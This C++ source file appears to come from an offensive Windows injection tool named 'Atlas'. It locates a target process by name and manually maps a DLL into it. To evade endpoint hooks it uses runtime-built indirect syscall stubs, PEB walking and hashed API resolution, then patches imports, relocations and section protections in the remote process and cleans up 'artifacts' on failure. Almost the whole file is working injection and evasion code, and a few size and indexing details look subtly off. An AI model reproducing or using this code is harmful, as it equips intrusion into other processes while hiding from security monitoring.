#include <win32.h>

BOOL CleanArtifacts(ATLAS_UTILS* atlas_utils, ARTIFACT_DATA* artifact_data){
    bool cleaned = TRUE;

    fnNtFreeVirtualMemory sysInvoke = (fnNtFreeVirtualMemory)C_SyscallPrepare(atlas_utils, atlas_utils->atlas_syscalls.NtFreeVirtualMemory);
    NTSTATUS statusSys = sysInvoke(artifact_data->hRemote, &artifact_data->pTargetAddr, &artifact_data->imageSize, MEM_RELEASE);
    if(!NT_SUCCESS(statusSys)){
        printf("%s - Error while cleaning artifacts, remote process probably died. NTSTATUS: %lx\n", err, statusSys);
        cleaned = FALSE;
    }

    C_SyscallCleanup(atlas_utils, (PVOID)sysInvoke);

    return cleaned;
}

VOID ErrorCallback(const char* msg, DWORD lastError, NTSTATUS status, ATLAS_UTILS* atlas_utils, ARTIFACT_DATA* artifact_data, BOOL freeMem){
    if(lastError){
        printf("%s - %s -> lastError: %d\n", err, msg, lastError);
    }
    else{
        printf("%s - %s -> NTSTATUS: %lx\n", err, msg, status);
    }

    if(freeMem){
        printf("%s - Cleaning artifacts from remote\n", info);
        if(CleanArtifacts(atlas_utils, artifact_data)){
            printf("%s - Artifacts cleaned from remote\n", ok);
        }
    }

    exit(EXIT_FAILURE);
}

DWORD FindTargetPid(LPCWSTR target, ATLAS_UTILS* atlas_utils){
    ULONG returnLength = 0;
    DWORD pid = 0;
    NTSTATUS status;

    fnNtQuerySystemInformation sysInvoke = (fnNtQuerySystemInformation)C_SyscallPrepare(atlas_utils, atlas_utils->atlas_syscalls.NtQuerySystemInformation);
    sysInvoke(SystemProcessInformation, NULL, 0, &returnLength);

    PSYSTEM_PROCESS_INFORMATION pSpi = (PSYSTEM_PROCESS_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (SIZE_T)returnLength);

    status = sysInvoke(SystemProcessInformation, pSpi, returnLength, NULL);
    
    if(!NT_SUCCESS(status)){
        ErrorCallback("Error while searching PID", 0, status, NULL, NULL, FALSE);
    }

    C_SyscallCleanup(atlas_utils, (PVOID)sysInvoke);

    while(true){
        if(pSpi->ImageName.Length && wcscmp(target, pSpi->ImageName.Buffer) == 0){
            pid = HandleToUlong(pSpi->UniqueProcessId);
            break;
        }

        if(pSpi->NextEntryOffset == 0){
            break;
        }

       pSpi = (PSYSTEM_PROCESS_INFORMATION)((ULONG_PTR)pSpi + pSpi->NextEntryOffset);
    }

    if(pid == 0){
        ErrorCallback("PID not found", GetLastError(), 0, NULL, NULL, FALSE);
    }

    printf("%s - PID of the target process: %ld\n\n", info, pid);

    return pid;
}

VOID PatchIAT(PVOID pLocalMappingAddr, DLL_DATA dll_data, ATLAS_UTILS* atlas_utils, ARTIFACT_DATA* artifact_data){
    if(dll_data.optHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size){
        PIMAGE_IMPORT_DESCRIPTOR pImportDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)((DWORD_PTR)pLocalMappingAddr + dll_data.optHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);

        HANDLE hDll;
        DLL_DATA iat_entry_dll_data;
        SIZE_T procAddr;

        while(pImportDescriptor->Name){
            char * dllName = (char*)((DWORD_PTR)pLocalMappingAddr + pImportDescriptor->Name);

            printf("\t\t%s - Fixing DLL: %s\n", info, dllName);

            if(!C_LoadLibrary(dllName, &hDll, atlas_utils)){
                ErrorCallback("Error patching IAT", -1, -1, atlas_utils, artifact_data, TRUE);
            }

            RetrieveDLL_DATA((PVOID)hDll, &iat_entry_dll_data);

            PIMAGE_THUNK_DATA pIAT = (PIMAGE_THUNK_DATA)((DWORD_PTR)pLocalMappingAddr + pImportDescriptor->FirstThunk);
            PIMAGE_THUNK_DATA pOriginalFirstThunk = (PIMAGE_THUNK_DATA)((DWORD_PTR)pLocalMappingAddr + pImportDescriptor->OriginalFirstThunk);

            while(pOriginalFirstThunk->u1.AddressOfData){
                if(IMAGE_SNAP_BY_ORDINAL(pOriginalFirstThunk->u1.Ordinal)){
                    procAddr = C_GetProcAddress(iat_entry_dll_data, NULL, IMAGE_ORDINAL(pOriginalFirstThunk->u1.Ordinal), atlas_utils);
                    if(procAddr != -1){
                        pIAT->u1.Function = procAddr;
                    }
                    else{
                        ErrorCallback("Error patching IAT", -1, -1, atlas_utils, artifact_data, TRUE);
                    }
                }
                else{
                    PIMAGE_IMPORT_BY_NAME pFunction = (PIMAGE_IMPORT_BY_NAME)((DWORD_PTR)pLocalMappingAddr + pOriginalFirstThunk->u1.AddressOfData);
                    procAddr = C_GetProcAddress(iat_entry_dll_data, C_HashString(ConvertCharToWideChar(pFunction->Name)), NULL, atlas_utils);
                    if(procAddr != -1){
                        pIAT->u1.Function = procAddr;
                    }
                    else{
                        ErrorCallback("Error patching IAT", -1, -1, atlas_utils, artifact_data, TRUE);
                    }
                }
         
                pOriginalFirstThunk++;
                pIAT++;
            }

            pImportDescriptor++;    
        }
    }
}

VOID FixRelocations(PVOID pTargetAddr, PVOID pLocalMappingAddr, DLL_DATA dll_data){
    DWORD_PTR delta = (DWORD_PTR)pTargetAddr - dll_data.preferedAddr;

    if(delta != 0){
        PIMAGE_BASE_RELOCATION pRelocRowData = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)pLocalMappingAddr + dll_data.optHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
        PBASE_RELOCATION_ENTRY pRelocationEntries = NULL;
         
        DWORD numTableEntries =   0;
        
        while (pRelocRowData->VirtualAddress){
            numTableEntries = (pRelocRowData->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(USHORT);
            pRelocationEntries = (PBASE_RELOCATION_ENTRY)(pRelocRowData + 1); 

            for(SIZE_T i = 0; i < numTableEntries; i++, pRelocationEntries++){
                PDWORD_PTR pEntryValue = (PDWORD_PTR)((LPBYTE)pLocalMappingAddr + (pRelocRowData->VirtualAddress + pRelocationEntries->Offset));

                if(pRelocationEntries->Type == IMAGE_REL_BASED_DIR64){
                    *pEntryValue += delta;
                }
                else if (pRelocationEntries->Type == IMAGE_REL_BASED_HIGHLOW){
                    *pEntryValue += (DWORD)delta;
                }
                else if (pRelocationEntries->Type == IMAGE_REL_BASED_HIGH){
                    *pEntryValue += HIWORD(delta);
                }
                else if (pRelocationEntries->Type == IMAGE_REL_BASED_LOW){
                    *pEntryValue += LOWORD(delta);
                }
            }

            pRelocRowData = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)pRelocRowData + pRelocRowData->SizeOfBlock);
        }
    }
}

VOID FixMemoryProtections(ARTIFACT_DATA* artifact_data, PVOID pLocalMappingAddr, DLL_DATA dll_data, ATLAS_UTILS* atlas_utils){ 
    DWORD_PTR delta = (DWORD_PTR)artifact_data->pTargetAddr - (DWORD_PTR)pLocalMappingAddr;
   
    DWORD sectionHeaderOffset = dll_data.dosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS);
    PIMAGE_SECTION_HEADER pSectionHeader = new IMAGE_SECTION_HEADER;

    DWORD IAT_rva = dll_data.optHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;

    fnNtProtectVirtualMemory sysInvoke = (fnNtProtectVirtualMemory)C_SyscallPrepare(atlas_utils, atlas_utils->atlas_syscalls.NtProtectVirtualMemory);

    for(SIZE_T i = 0; i < dll_data.fileHeader->NumberOfSections; i++){        
        DWORD_PTR sectionHeaderAddr = DWORD_PTR((DWORD_PTR)pLocalMappingAddr + sectionHeaderOffset + i * sizeof(IMAGE_SECTION_HEADER));
        pSectionHeader = (PIMAGE_SECTION_HEADER)sectionHeaderAddr;

        sectionHeaderAddr += delta;

        PVOID pSectionAddr = (PVOID)((DWORD_PTR)artifact_data->pTargetAddr + pSectionHeader->VirtualAddress);
        SIZE_T sectionSize = pSectionHeader->Misc.VirtualSize;
        ULONG protection = 0;
        ULONG oldProtection = 0;

        if(pSectionHeader->Characteristics & IMAGE_SCN_MEM_WRITE){
            protection = PAGE_WRITECOPY;
        }   
        if(pSectionHeader->Characteristics & IMAGE_SCN_MEM_READ){
            protection = PAGE_READONLY;
        }
        if((pSectionHeader->Characteristics & IMAGE_SCN_MEM_WRITE) && (pSectionHeader->Characteristics & IMAGE_SCN_MEM_READ)){
            protection = PAGE_READWRITE;
        }
        if(pSectionHeader->Characteristics & IMAGE_SCN_MEM_EXECUTE){
            protection = PAGE_EXECUTE;
        }
        if((pSectionHeader->Characteristics & IMAGE_SCN_MEM_WRITE) && (pSectionHeader->Characteristics & IMAGE_SCN_MEM_EXECUTE)){
            protection = PAGE_EXECUTE_WRITECOPY;
        }
        if((pSectionHeader->Characteristics & IMAGE_SCN_MEM_READ) && (pSectionHeader->Characteristics & IMAGE_SCN_MEM_EXECUTE)){
            protection = PAGE_EXECUTE_READ;
        }
        if((pSectionHeader->Characteristics & IMAGE_SCN_MEM_READ) &&(pSectionHeader->Characteristics & IMAGE_SCN_MEM_WRITE) && (pSectionHeader->Characteristics & IMAGE_SCN_MEM_EXECUTE)){
            protection = PAGE_EXECUTE_READWRITE;
        }  

        if(IAT_rva >= pSectionHeader->VirtualAddress && IAT_rva < (pSectionHeader->VirtualAddress + pSectionHeader->SizeOfRawData)){
            if (!(protection & PAGE_WRITECOPY)){
                switch (protection) {
                    case PAGE_READONLY:
                        protection = PAGE_READWRITE;
                        break;
                    case PAGE_EXECUTE:
                        protection = PAGE_EXECUTE_WRITECOPY;
                        break;
                    case PAGE_EXECUTE_READ:
                        protection = PAGE_EXECUTE_READWRITE;
                        break;
                    default:
                        break;
                }
            }
        }

        NTSTATUS status = sysInvoke(artifact_data->hRemote, &pSectionAddr, &sectionSize, protection, &oldProtection);
        if (!NT_SUCCESS(status)) {
            ErrorCallback("Memory protection failed", 0, status, atlas_utils, artifact_data, TRUE);
        }    
    }

    C_SyscallCleanup(atlas_utils, (PVOID)sysInvoke);  
}



PVOID C_GetModuleHandle(DWORD dll){
    wchar_t* wBaseDll;

    C_PPEB_LDR_DATA pLdrData = (C_PPEB_LDR_DATA)((PPEB)PPEB_PTR)->Ldr;
    C_PLDR_DATA_TABLE_ENTRY pLdrEntry = (C_PLDR_DATA_TABLE_ENTRY)pLdrData->InLoadOrderModuleList.Flink;

    while(pLdrEntry->DllBase != NULL){
        wBaseDll = new wchar_t[pLdrEntry->BaseDllName.Length + 1];

        wcsncpy(wBaseDll, pLdrEntry->BaseDllName.Buffer, pLdrEntry->BaseDllName.Length + 1);
        if(C_HashString(wBaseDll) == dll){
            delete [] wBaseDll;
            return pLdrEntry->DllBase;
        }

        pLdrEntry = (C_PLDR_DATA_TABLE_ENTRY)pLdrEntry->InLoadOrderLinks.Flink;
    }

    delete [] wBaseDll;
    return NULL;
}

BOOL C_LoadLibrary(char* dllName, PHANDLE pHDll, ATLAS_UTILS* atlas_utils){
    UNICODE_STRING usDllName;
    if(!ConvertCharToUnicode(dllName, &usDllName)){
        return FALSE;
    } 

    NTSTATUS status = atlas_utils->pLdrLoadDll(NULL, 0, &usDllName, pHDll);
    if(!NT_SUCCESS(status)){
        return FALSE;
    }

    return TRUE;
}

std::pair<DLL_DATA, DWORD> C_PrepareForwardedProc(SIZE_T funcAddr, ATLAS_UTILS* atlas_utils){
    char* rawFuncContent = new char[MAX_PATH];
    char* forwardedDLL = new char[MAX_PATH];
    char* forwardedFunction = new char[MAX_PATH];

    memcpy(rawFuncContent, (PVOID)funcAddr, MAX_PATH);

    SIZE_T dotIndex = 0;
    while(rawFuncContent[dotIndex] != '.'){
        dotIndex++;
    }

    memcpy(forwardedDLL, (PVOID)funcAddr, dotIndex);
    forwardedDLL[dotIndex] = '\0';

    strcat(forwardedDLL, ".dll");

    SIZE_T forwardedFunctionSize = StrLength((char*)funcAddr + dotIndex + 1);
    memcpy(forwardedFunction, (PVOID)funcAddr + dotIndex + 1, forwardedFunctionSize);
    forwardedFunction[forwardedFunctionSize] = '\0';

    HANDLE hDll;
    PVOID pModule;
    
    pModule = C_GetModuleHandle(C_HashString(ConvertCharToWideChar(forwardedDLL)));

    if(pModule == NULL){
        if(!C_LoadLibrary(forwardedDLL, &hDll, atlas_utils)){
            ErrorCallback("Error loading forwarded function module", -1, -1, atlas_utils, NULL, FALSE);
        }

        pModule = (PVOID) hDll;
    }
    
    
    DLL_DATA dll_forward_data;
    RetrieveDLL_DATA(pModule, &dll_forward_data); 

    return std::make_pair(dll_forward_data, C_HashString(ConvertCharToWideChar(forwardedFunction)));
}

size_t C_GetProcAddress(DLL_DATA dll_data, DWORD targetFuncHash, WORD ordinal, ATLAS_UTILS* atlas_utils){ 
    IMAGE_DATA_DIRECTORY pExportedDir = dll_data.optHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];

    PIMAGE_EXPORT_DIRECTORY pExportTable = (PIMAGE_EXPORT_DIRECTORY)((DWORD_PTR)dll_data.baseAddr + pExportedDir.VirtualAddress);

    PDWORD pFuncNames = (PDWORD)((DWORD_PTR)dll_data.baseAddr + pExportTable->AddressOfNames);
    PDWORD pFuncAddrs = (PDWORD)((DWORD_PTR)dll_data.baseAddr + pExportTable->AddressOfFunctions);
    PWORD pOrdinals = (PWORD)((DWORD_PTR)dll_data.baseAddr + pExportTable->AddressOfNameOrdinals);

    for(size_t i = 0; i < pExportTable->NumberOfNames; i++){
        char *funcName = (char*)((DWORD_PTR)dll_data.baseAddr + pFuncNames[i]);
        WORD *funcOrdinal = (WORD*)((DWORD_PTR)dll_data.baseAddr + pOrdinals[i]);
        
        if(ordinal != NULL){
            if(funcOrdinal[i] == ordinal){
                size_t funcAddr = (size_t)((DWORD_PTR)dll_data.baseAddr + pFuncAddrs[pOrdinals[i]]);

                if(funcAddr >= (DWORD_PTR) pExportTable && funcAddr < ((SIZE_T)pExportTable + pExportedDir.Size)){
                    std::pair<DLL_DATA, DWORD> forwardedFunc = C_PrepareForwardedProc(funcAddr, atlas_utils);
                    funcAddr = C_GetProcAddress(forwardedFunc.first, forwardedFunc.second, NULL, atlas_utils);
                }

                return funcAddr;  
            }
        }
        else{
            wchar_t* wfuncName = ConvertCharToWideChar(funcName);
            if(wfuncName != NULL && C_HashString(wfuncName) == targetFuncHash){
                size_t funcAddr = (size_t)((DWORD_PTR)dll_data.baseAddr + pFuncAddrs[pOrdinals[i]]);

                if(funcAddr >= (DWORD_PTR)pExportTable && funcAddr < ((SIZE_T)pExportTable + pExportedDir.Size)){
                    std::pair<DLL_DATA, DWORD> forwardedFunc = C_PrepareForwardedProc(funcAddr, atlas_utils);
                    funcAddr = C_GetProcAddress(forwardedFunc.first, forwardedFunc.second, NULL, atlas_utils);
                }
                
                return funcAddr; 
            }
        }
    }

    return -1;
}

PVOID C_SyscallPrepare(ATLAS_UTILS* atlas_utils, SYSCALL_INFO syscallInfo){
    BYTE* stub = new BYTE[21]{
        0x4C, 0x8B, 0xD1,
        0xB8, 0x00, 0x00, 0x00, 0x00,
        0x49, 0xBB, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x41, 0xFF, 0xE3
    }; 

    ULONG stubSize = (22 * sizeof(BYTE)); 
    SIZE_T regionSize = (22 * sizeof(BYTE));
    
    memcpy(&stub[4], &syscallInfo.ssn, sizeof(DWORD));
    memcpy(&stub[10], &syscallInfo.stubAddr, sizeof(PVOID));

    HANDLE currentHandle = GetCurrentProcess();

    PVOID pBaseAddr = NULL;
    NTSTATUS status;

    status = atlas_utils->pNtAllocateVirtualMemory(currentHandle, &pBaseAddr, 0, &regionSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if(!NT_SUCCESS(status)){
        ErrorCallback("Allocation failed", 0, status, NULL, NULL, FALSE);
    }

    status = atlas_utils->pNtWriteVirtualMemory(currentHandle, pBaseAddr, (PVOID)(stub), stubSize, NULL); 
    if(!NT_SUCCESS(status)){
        ErrorCallback("Memory Write failed", 0, status, NULL, NULL, FALSE);
    }

    delete [] stub;

    ULONG oldProtection = 0;
    status = atlas_utils->pNtProtectVirtualMemory(currentHandle, &pBaseAddr, &regionSize, PAGE_EXECUTE_READ, &oldProtection);
    if(!NT_SUCCESS(status)){
        ErrorCallback("Memory protection failed", 0, status, NULL, NULL, FALSE);
    }

    return pBaseAddr;
}

VOID C_SyscallCleanup(ATLAS_UTILS* atlas_utils, PVOID pStubAddr){
    SIZE_T size = 22; 
    NTSTATUS status = atlas_utils->pNtFreeVirtualMemory(GetCurrentProcess(), &pStubAddr, &size, MEM_RELEASE);
      if(!NT_SUCCESS(status)){
        ErrorCallback("Cleanup failed", 0, status, NULL, NULL, FALSE);
    }
}


VOID RetrieveDLL_DATA(PVOID pDllAddr, DLL_DATA* dll_data){
    PIMAGE_DOS_HEADER pDosHeader;
    PIMAGE_NT_HEADERS pNtHeader;

    pDosHeader = (PIMAGE_DOS_HEADER)pDllAddr;

    if(pDosHeader->e_magic != IMAGE_DOS_SIGNATURE){
        ErrorCallback("DOS Header signature mismatch", -1, 0, NULL, NULL, FALSE);
    }

    pNtHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)pDllAddr + pDosHeader->e_lfanew);
    if(pNtHeader->Signature != IMAGE_NT_SIGNATURE){
        ErrorCallback("NT Header signature mismatch", -1, 0, NULL, NULL, FALSE);
    }
    

    dll_data->baseAddr = pDllAddr;
    dll_data->dosHeader = pDosHeader;
    dll_data->ntHeaders = pNtHeader;
    dll_data->fileHeader = &pNtHeader->FileHeader;
    dll_data->optHeader = &pNtHeader->OptionalHeader;

    dll_data->preferedAddr = dll_data->optHeader->ImageBase;
    dll_data->imageSize = dll_data->optHeader->SizeOfImage;
    dll_data->entryPoint = dll_data->optHeader->AddressOfEntryPoint;
}

VOID RetrieveUtils(ATLAS_UTILS* atlas_utils){
    DLL_DATA dll_data; 

    PVOID pNtpDllAddress = C_GetModuleHandle(Sys_Ntdll);

    if(pNtpDllAddress == NULL){
        ErrorCallback("Retrieve of MODULE handle failed", GetLastError(), 0, NULL, NULL, FALSE);
    }
    
    RetrieveDLL_DATA(pNtpDllAddress, &dll_data);

    fnLdrLoadDll pLdrLoadDll = (fnLdrLoadDll)C_GetProcAddress(dll_data, Sys_LdrLoadDll, NULL, NULL);
    if(pLdrLoadDll == NULL){
        ErrorCallback("Retrieve of aux func 1 failed", GetLastError(), 0, NULL, NULL, FALSE);
    }

    fnNtWriteVirtualMemory pNtWriteVirtualMemory = (fnNtWriteVirtualMemory)C_GetProcAddress(dll_data, Sys_NtWriteVirtualMemory, NULL, NULL);
    if(pNtWriteVirtualMemory == NULL){
        ErrorCallback("Retrieve of aux func 2 failed", GetLastError(), 0, NULL, NULL, FALSE);
    }

    fnNtAllocateVirtualMemory pNtAllocateVirtualMemory = (fnNtAllocateVirtualMemory)C_GetProcAddress(dll_data, Sys_ZwAllocateVirtualMemory, NULL, NULL);
    if(pNtAllocateVirtualMemory == NULL){
        ErrorCallback("Retrieve of aux func 3 failed", GetLastError(), 0, NULL, NULL, FALSE);
    }

    fnNtFreeVirtualMemory pNtFreeVirtualMemory = (fnNtFreeVirtualMemory)C_GetProcAddress(dll_data, Sys_ZwFreeVirtualMemory, NULL, NULL);
    if(pNtFreeVirtualMemory == NULL){
        ErrorCallback("Retrieve of aux func 4 failed", GetLastError(), 0, NULL, NULL, FALSE);
    }

    fnNtProtectVirtualMemory pNtProtectVirtualMemory = (fnNtProtectVirtualMemory)C_GetProcAddress(dll_data, Sys_ZwProtectVirtualMemory, NULL, NULL);
    if(pNtProtectVirtualMemory == NULL){
        ErrorCallback("Retrieve of aux func 5 failed", GetLastError(), 0, NULL, NULL, FALSE);
    }

    atlas_utils->atlas_syscalls.NtOpenProcess.ssn = C_RetrieveSSN(Sys_ZwOpenProcess, dll_data);
    atlas_utils->atlas_syscalls.NtAllocateVirtualMemory.ssn = C_RetrieveSSN(Sys_ZwAllocateVirtualMemory, dll_data);
    atlas_utils->atlas_syscalls.NtProtectVirtualMemory.ssn = C_RetrieveSSN(Sys_ZwProtectVirtualMemory, dll_data);
    atlas_utils->atlas_syscalls.NtQuerySystemInformation.ssn = C_RetrieveSSN(Sys_ZwQuerySystemInformation, dll_data);
    atlas_utils->atlas_syscalls.NtCreateThreadEx.ssn = C_RetrieveSSN(Sys_ZwCreateThreadEx, dll_data);
    atlas_utils->atlas_syscalls.NtFreeVirtualMemory.ssn = C_RetrieveSSN(Sys_ZwFreeVirtualMemory, dll_data);

    atlas_utils->atlas_syscalls.NtOpenProcess.stubAddr = C_RetrieveSyscallAddr(C_GetProcAddress(dll_data, Sys_ZwOpenProcess, NULL, NULL));
    atlas_utils->atlas_syscalls.NtAllocateVirtualMemory.stubAddr = C_RetrieveSyscallAddr(C_GetProcAddress(dll_data, Sys_ZwAllocateVirtualMemory, NULL, NULL));
    atlas_utils->atlas_syscalls.NtProtectVirtualMemory.stubAddr = C_RetrieveSyscallAddr(C_GetProcAddress(dll_data, Sys_ZwProtectVirtualMemory, NULL, NULL));
    atlas_utils->atlas_syscalls.NtQuerySystemInformation.stubAddr = C_RetrieveSyscallAddr(C_GetProcAddress(dll_data, Sys_ZwQuerySystemInformation, NULL, NULL));
    atlas_utils->atlas_syscalls.NtCreateThreadEx.stubAddr = C_RetrieveSyscallAddr(C_GetProcAddress(dll_data, Sys_ZwCreateThreadEx, NULL, NULL));
    atlas_utils->atlas_syscalls.NtFreeVirtualMemory.stubAddr = C_RetrieveSyscallAddr(C_GetProcAddress(dll_data, Sys_ZwFreeVirtualMemory, NULL, NULL));

    atlas_utils->pLdrLoadDll = pLdrLoadDll;
    atlas_utils->pNtWriteVirtualMemory = pNtWriteVirtualMemory; 
    atlas_utils->pNtAllocateVirtualMemory = pNtAllocateVirtualMemory;
    atlas_utils->pNtFreeVirtualMemory = pNtFreeVirtualMemory;
    atlas_utils->pNtProtectVirtualMemory = pNtProtectVirtualMemory;
}